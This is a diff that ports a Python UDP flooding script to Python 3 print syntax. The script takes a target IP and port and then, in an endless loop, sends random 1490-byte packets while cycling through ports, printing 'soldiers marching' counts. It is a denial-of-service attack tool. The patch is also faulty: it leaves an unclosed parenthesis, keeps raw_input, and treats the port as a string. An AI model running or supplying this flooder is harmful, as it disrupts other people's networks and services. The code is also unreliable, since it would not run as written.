@@ -19,29 +19,29 @@ bytes = random._urandom(1490)
 
 os.system("clear")
 os.system("Unch Unch Paranoia")
-print
+print()
 print("Author   : Ngabbers"
-print
+print()
 ip = raw_input("IP : ")
 port = input("Port       : ")
 
 os.system("clear")
 os.system("Anxiety Starting")
-print "[                    ] 0% "
+print("[                    ] 0% ")
 time.sleep(5)
-print "[=====               ] 25%"
+print("[=====               ] 25%")
 time.sleep(5)
-print "[==========          ] 50%"
+print("[==========          ] 50%")
 time.sleep(5)
-print "[===============     ] 75%"
+print("[===============     ] 75%")
 time.sleep(5)
-print "[====================] 100%"
+print("[====================] 100%")
 time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "%s soldiers marching to %s : %s"%(sent,ip,port)
+     print("%s soldiers marching to %s : %s"%(sent,ip,port))
      if port == 65534:
        port = 1
